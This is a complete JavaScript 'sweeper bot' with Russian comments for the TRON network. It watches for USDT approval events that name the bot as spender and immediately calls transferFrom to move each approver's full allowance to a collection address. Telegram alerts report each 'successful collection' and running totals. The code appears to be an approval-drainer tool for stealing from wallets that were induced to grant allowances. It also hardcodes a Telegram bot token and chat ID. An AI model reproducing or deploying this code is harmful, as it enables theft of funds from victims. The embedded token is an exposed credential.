// ============================================
// SWEEPER BOT – ФИНАЛЬНАЯ ВЕРСИЯ С УМНОЙ ОБРАБОТКОЙ ОШИБОК
// ============================================

const TronWeb = require('tronweb');
const dotenv = require('dotenv');
dotenv.config();

// -------------------- 1. ИНИЦИАЛИЗАЦИЯ --------------------
const tronWeb = new TronWeb({
    fullHost: process.env.TRONGRID_API,
    privateKey: process.env.BOT_PRIVATE_KEY
});

const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
const BOT_ADDRESS = tronWeb.address.fromPrivateKey(process.env.BOT_PRIVATE_KEY);

// Telegram настройки
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

// Состояние бота
let isActive = true;
let processedTxs = new Set();
let processedAddresses = new Set(); // Для отслеживания уже обработанных адресов
let lastProcessedTime = null;
let stats = {
    totalCollected: 0,
    totalTransactions: 0,
    lastDailyReset: Date.now(),
    dailyCollected: 0,
    dailyTransactions: 0,
    totalErrors: 0
};
const startTime = Date.now();

console.log('\n🚀 SWEEPER BOT ЗАПУЩЕН');
console.log('=================================');
console.log(`Адрес бота: ${BOT_ADDRESS}`);
console.log(`Сбор USDT на: ${COLLECTION_ADDRESS}`);
console.log('=================================\n');

// -------------------- 2. ФУНКЦИЯ ОТПРАВКИ В TELEGRAM --------------------
async function sendTelegramNotification(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        if (!response.ok) {
            console.log('❌ Ошибка Telegram API:', result);
        }
    } catch (error) {
        console.error('❌ Ошибка при отправке в Telegram:', error.message);
    }
}

// Отправка стартового сообщения
sendTelegramNotification(`
🚀 <b>Бот запущен</b>

📍 Адрес бота: <code>${BOT_ADDRESS}</code>
💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>
⚡️ Баланс бота: проверяется...

Команды:
/start_bot - включить сбор
/stop_bot - выключить сбор
/status - статистика
/errors - показать статистику ошибок
`);

// -------------------- 3. ПРОВЕРКА КОМАНД --------------------
async function checkTelegramCommands() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.result && data.result.length) {
            const msg = data.result[data.result.length - 1].message;
            if (msg && msg.text && msg.chat.id.toString() === TELEGRAM_CHAT_ID) {
                const cmd = msg.text.toLowerCase();
                
                if (cmd === '/start_bot' && !isActive) {
                    isActive = true;
                    await sendTelegramNotification('✅ Бот включён');
                } 
                else if (cmd === '/stop_bot' && isActive) {
                    isActive = false;
                    await sendTelegramNotification('🛑 Бот остановлен');
                } 
                else if (cmd === '/status') {
                    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
                    const status = isActive ? '🟢 РАБОТАЕТ' : '🔴 ОСТАНОВЛЕН';
                    
                    // Получаем текущий баланс
                    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
                    const balanceTRX = tronWeb.fromSun(balance);
                    
                    await sendTelegramNotification(`
📊 <b>СТАТУС БОТА</b>

${status}
⏱ Время работы: ${uptime} мин
💰 Баланс бота: ${balanceTRX} TRX

📈 <b>Статистика:</b>
💵 Всего собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.totalTransactions}
❌ Ошибок: ${stats.totalErrors}
📅 Сегодня: ${stats.dailyCollected.toFixed(2)} USDT
                    `);
                }
                else if (cmd === '/errors') {
                    await sendTelegramNotification(`
❌ <b>СТАТИСТИКА ОШИБОК</b>
📊 Всего ошибок: ${stats.totalErrors}
⏱ Последняя проверка: ${lastProcessedTime || 'нет'}
                    `);
                }
            }
        }
    } catch (error) {
        console.error('Ошибка проверки команд:', error.message);
    }
}

// -------------------- 4. ПРОВЕРКА БАЛАНСА --------------------
async function checkBotBalance() {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        
        if (balanceTRX < 20) {
            await sendTelegramNotification(`
⚠️ <b>КРИТИЧЕСКИ НИЗКИЙ БАЛАНС TRX!</b>
💰 Текущий баланс: ${balanceTRX} TRX
🔋 Минимально необходимо: 40 TRX

<b>Бот НЕ сможет отправлять транзакции!</b>
Пополните кошелек бота: <code>${BOT_ADDRESS}</code>
            `);
        }
        else if (balanceTRX < 40) {
            console.log(`⚠️ Баланс бота ${balanceTRX} TRX — рекомендуется пополнить до 40 TRX`);
        }
        
        return balanceTRX;
    } catch (error) {
        return 0;
    }
}

// -------------------- 5. ПОИСК APPROVE --------------------
async function getNewApprovals() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
        const response = await fetch(
            `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?` +
            new URLSearchParams({
                event_name: 'Approval',
                limit: 100,
                order_by: 'block_timestamp,desc',
                min_block_timestamp: oneDayAgo
            })
        );
        
        if (!response.ok) {
            console.log('❌ Ошибка API Trongrid');
            return [];
        }
        
        const data = await response.json();
        if (!data.data) return [];

        return data.data.filter(event => {
            const spender = tronWeb.address.fromHex(event.result.spender);
            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
        });
    } catch (error) {
        console.error('Ошибка получения событий:', error.message);
        return [];
    }
}

// -------------------- 6. ФУНКЦИЯ АНАЛИЗА ОШИБОК --------------------
function analyzeError(error, context = {}) {
    const errorMessage = error.message || '';
    let errorType = 'UNKNOWN';
    let errorCategory = 'Другая ошибка';
    let recommendation = '';
    let emoji = '❌';

    // Анализируем текст ошибки
    if (errorMessage.includes('request aborted')) {
        errorType = 'REQUEST_ABORTED';
        errorCategory = '⚠️ Сбой запроса';
        recommendation = 'Нехватка энергии или сети. Увеличьте feeLimit или баланс TRX.';
        emoji = '⚠️';
    }
    else if (errorMessage.includes('timeout')) {
        errorType = 'TIMEOUT';
        errorCategory = '⏱ Таймаут';
        recommendation = 'Сеть перегружена. Повторите попытку позже.';
        emoji = '⏱';
    }
    else if (errorMessage.includes('revert')) {
        errorType = 'REVERT';
        errorCategory = '❌ Откат транзакции';
        recommendation = 'Проверьте allowance и баланс пользователя.';
        emoji = '❌';
    }
    else if (errorMessage.includes('out of energy') || errorMessage.includes('OUT_OF_ENERGY')) {
        errorType = 'OUT_OF_ENERGY';
        errorCategory = '⚡ Нехватка энергии';
        recommendation = 'Увеличьте feeLimit или застейкайте TRX.';
        emoji = '⚡';
    }
    else if (errorMessage.includes('insufficient balance')) {
        errorType = 'INSUFFICIENT_BALANCE';
        errorCategory = '💰 Недостаточно баланса';
        recommendation = 'У пользователя закончились USDT.';
        emoji = '💰';
    }
    else if (errorMessage.includes('user rejected')) {
        errorType = 'USER_REJECTED';
        errorCategory = '👤 Отмена пользователем';
        recommendation = 'Пользователь отклонил транзакцию.';
        emoji = '👤';
    }
    else if (errorMessage.includes('invalid parameters')) {
        errorType = 'INVALID_PARAMS';
        errorCategory = '🔧 Неверные параметры';
        recommendation = 'Проверьте адреса в конфигурации.';
        emoji = '🔧';
    }

    return {
        type: errorType,
        category: errorCategory,
        recommendation: recommendation,
        emoji: emoji,
        message: errorMessage
    };
}

// -------------------- 7. ОБРАБОТКА APPROVE --------------------
async function processApproval(event) {
    const owner = tronWeb.address.fromHex(event.result.owner);
    const value = event.result.value;
    const valueUSDT = (value / 1_000_000).toFixed(2);
    const txId = event.transaction_id;

    if (processedTxs.has(txId)) {
        console.log(`⏩ Уже обработан: ${txId.slice(0,8)}...`);
        return;
    }

    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);

    try {
        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
        
        // 1. ПРОВЕРЯЕМ РЕАЛЬНЫЙ ALLOWANCE
        const realAllowance = await contract.allowance(owner, BOT_ADDRESS).call();
        if (realAllowance === 0) {
            const errorMsg = `⚠️ Allowance = 0 для ${owner.slice(0,8)}... (ложное событие)`;
            console.log(errorMsg);
            await sendTelegramNotification(errorMsg);
            processedTxs.add(txId);
            return;
        }

        // 2. ПРОВЕРЯЕМ БАЛАНС ВЛАДЕЛЬЦА
        const balance = await contract.balanceOf(owner).call();
        if (balance < value) {
            const errorMsg = `⚠️ Недостаточно USDT у ${owner.slice(0,8)}... (баланс: ${(balance/1_000_000).toFixed(2)} USDT)`;
            console.log(errorMsg);
            await sendTelegramNotification(errorMsg);
            processedTxs.add(txId);
            return;
        }

        // 3. ПРОВЕРЯЕМ БАЛАНС БОТА
        const botBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const botBalanceTRX = tronWeb.fromSun(botBalance);
        
        if (botBalanceTRX < 20) {
            const errorMsg = `⚠️ КРИТИЧЕСКИ: у бота только ${botBalanceTRX} TRX (нужно минимум 40)`;
            console.log(errorMsg);
            await sendTelegramNotification(errorMsg);
            return; // Не добавляем в processedTxs
        }

        // 4. ВЫПОЛНЯЕМ TRANSFERFROM С ДЕТАЛЬНОЙ ОБРАБОТКОЙ
        console.log(`   💸 Отправляю transferFrom на ${valueUSDT} USDT...`);

        try {
            const tx = await contract.transferFrom(
                owner,
                COLLECTION_ADDRESS,
                value
            ).send({
                feeLimit: 600_000_000, // 60 TRX (запас)
                callValue: 0,
                shouldPollResponse: true
            });

            // УСПЕХ!
            console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
            
            // Обновляем статистику
            const amountNum = parseFloat(valueUSDT);
            stats.totalCollected += amountNum;
            stats.totalTransactions++;
            stats.dailyCollected += amountNum;
            stats.dailyTransactions++;

            // Отправляем уведомление об успехе
            await sendTelegramNotification(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>

💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
🤖 Баланс бота: ${botBalanceTRX} TRX
🔗 Транзакция: https://tronscan.org/#/transaction/${tx}
            `);

            processedTxs.add(txId);

        } catch (transferError) {
            // Анализируем ошибку
            const analysis = analyzeError(transferError, {
                owner: owner,
                amount: valueUSDT,
                botBalance: botBalanceTRX
            });

            // Увеличиваем счётчик ошибок
            stats.totalErrors++;

            // Формируем детальный отчёт
            const errorReport = `
${analysis.emoji} <b>ОШИБКА TRANSFERFROM</b>
📟 Код: ${analysis.type}
🔧 Тип: ${analysis.category}
📝 Сообщение: ${analysis.message}

📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
💰 Сумма: ${valueUSDT} USDT
🤖 Баланс бота: ${botBalanceTRX} TRX
🔓 Allowance: ${(realAllowance/1_000_000)} USDT

💡 Рекомендация: ${analysis.recommendation}
⏰ Время: ${new Date().toLocaleString()}
            `;

            console.error(errorReport);
            await sendTelegramNotification(errorReport);

            // НЕ добавляем в processedTxs — бот будет повторять попытки
            // processedTxs.add(txId); // Закомментировано — даём шанс повторить
        }

    } catch (error) {
        console.error(`❌ Критическая ошибка в processApproval:`, error.message);
        stats.totalErrors++;
        await sendTelegramNotification(`❌ Критическая ошибка: ${error.message}`);
    }
}

// -------------------- 8. ДНЕВНОЙ ОТЧЁТ --------------------
async function checkDailyStats() {
    const now = Date.now();
    if (now - stats.lastDailyReset > 24 * 60 * 60 * 1000) {
        if (stats.dailyTransactions > 0 || stats.totalErrors > 0) {
            await sendTelegramNotification(`
📊 <b>ДНЕВНОЙ ОТЧЁТ</b>

💰 Собрано: ${stats.dailyCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.dailyTransactions}
❌ Ошибок за день: ${stats.totalErrors}
📊 Средняя сумма: ${stats.dailyTransactions > 0 ? (stats.dailyCollected / stats.dailyTransactions).toFixed(2) : 0} USDT
            `);
        }
        stats.dailyCollected = 0;
        stats.dailyTransactions = 0;
        stats.totalErrors = 0;
        stats.lastDailyReset = now;
    }
}

// -------------------- 9. ОСНОВНОЙ ЦИКЛ --------------------
async function checkAndSweep() {
    lastProcessedTime = new Date().toLocaleString();

    await checkTelegramCommands();
    if (!isActive) {
        console.log('⏸ Бот остановлен');
        return;
    }

    console.log(`\n🔄 ПРОВЕРКА [${new Date().toLocaleString()}]`);
    
    // Проверяем баланс и статистику
    await checkBotBalance();
    await checkDailyStats();

    // Ищем новые approve
    const approvals = await getNewApprovals();
    
    if (approvals.length === 0) {
        console.log('⏳ Новых approve нет');
        return;
    }

    console.log(`📋 Найдено ${approvals.length} новых approve`);
    
    // Обрабатываем каждый approve
    for (const app of approvals) {
        await processApproval(app);
        // Пауза между транзакциями
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// -------------------- 10. ЗАПУСК --------------------
// Запускаем первую проверку сразу
checkAndSweep();

// Запускаем проверку каждые 30 секунд
setInterval(checkAndSweep, 30000);

// -------------------- 11. ОБРАБОТКА ОСТАНОВКИ --------------------
process.on('SIGINT', async () => {
    console.log('\n👋 Получен сигнал остановки...');
    
    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
    
    await sendTelegramNotification(`
🛑 <b>Бот остановлен</b>

📊 <b>ИТОГОВАЯ СТАТИСТИКА:</b>
💰 Всего собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Всего транзакций: ${stats.totalTransactions}
❌ Всего ошибок: ${stats.totalErrors}
⏱ Время работы: ${uptime} минут

👋 До свидания!
    `);
    
    console.log('✅ Бот остановлен');
    process.exit(0);
});

// Обработка необработанных ошибок
process.on('unhandledRejection', async (error) => {
    console.error('❗ Необработанная ошибка:', error);
    stats.totalErrors++;
    await sendTelegramNotification(`❗ Критическая ошибка: ${error.message}`);
});
